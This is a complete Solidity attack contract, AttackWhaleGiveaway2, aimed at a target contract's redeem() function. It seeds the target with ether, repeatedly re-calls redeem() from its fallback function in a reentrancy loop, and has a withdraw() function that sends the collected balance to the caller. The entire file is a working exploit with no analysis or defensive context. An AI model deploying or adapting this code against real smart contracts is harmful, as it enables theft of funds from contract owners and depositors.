pragma solidity ^0.4.19;

contract AttackWhaleGiveaway2 {
    address public target;
    uint public attackCount;

    constructor(address _target) public {
        target = _target;
    }

    // Reenter to trigger multiple "redeem" calls
    function() public payable {
        if (attackCount < 5) {
            attackCount++;
            target.call.value(0.999001 ether)(abi.encodeWithSignature("redeem()"));
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        // Seed the target contract with ETH
        target.call.value(1 ether)();
        // Initial redeem trigger
        target.call.value(0.999001 ether)(abi.encodeWithSignature("redeem()"));
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}

